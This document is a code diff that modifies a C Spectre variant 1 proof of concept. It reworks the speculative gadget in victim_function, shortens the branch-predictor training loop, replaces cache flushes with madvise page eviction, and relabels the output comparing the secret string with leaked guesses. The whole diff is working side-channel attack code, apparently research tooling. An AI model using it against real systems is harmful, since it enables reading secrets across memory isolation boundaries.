@@ -149,7 +149,6 @@ static inline unsigned long array_index_mask_nospec(unsigned long index,
 #endif
 
 void victim_function(size_t x, register volatile int32_t* dropbag, register volatile int32_t* alias) {
-  //*dropbag = 0;
   if (x < array1_size) {
 #ifdef INTEL_MITIGATION
 		/*
@@ -165,9 +164,8 @@ void victim_function(size_t x, register volatile int32_t* dropbag, register vola
     x &= array_index_mask_nospec(x, array1_size);
 #endif
     *dropbag = array1[x]+1;
-    temp &= array2[(*(alias)-1) * 512];
   } else { *dropbag = 0; }
-  //temp &= array2[(*(alias)-1) * 512];
+  temp &= array2[(*(alias)-1) * 512];
 }
 
 
@@ -231,7 +229,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     uint64_t malicious_alias = (uint64_t)alias;
     int32_t* alias_p;
     for (int k = 0; k < 10; k++) {
-      for (j = 400-1; j >= 0; j--) {
+      for (j = 100-1; j >= 0; j--) {
         /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
         /* Avoid jumps in case those tip off the branch predictor */
         x = (j - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
@@ -240,8 +238,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
         x = training_x ^ (x & (malicious_x ^ training_x));
 
         _mm_clflush( & array1_size);
-        //_mm_clflush( (void*)& dropbag);
-        //_mm_clflush( (void*)(malicious_alias));
+        madvise(malicious_alias & ~0xfff, 0x1000, MADV_DONTNEED);
 
         /* Delay (can also mfence) */
         for (volatile int z = 0; z < 100; z++) {}
@@ -446,7 +443,7 @@ int main(int argc,
     readMemoryByte(cache_hit_threshold, malicious_x++, value, score);
 
     /* Display the results */
-    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
+    printf("%s: ", (score[0] >= 2 * score[1] ? "  Clear" : "Unclear"));
     char guess = value[0] > 31 && value[0] < 127 ? value[0] : ' ';
     printf("0x%02X=’%c’ score=%d ", value[0],
       guess, score[0]);
@@ -462,6 +459,6 @@ int main(int argc,
     i++;
     printf("\n");
   }
-  printf("%s\n%s\n%s\n", secret_string, best_guess, second_guess);
+  printf("Target: %s\n Guess: %s\n  2nds: %s\n", secret_string, best_guess, second_guess);
   return (0);
 }
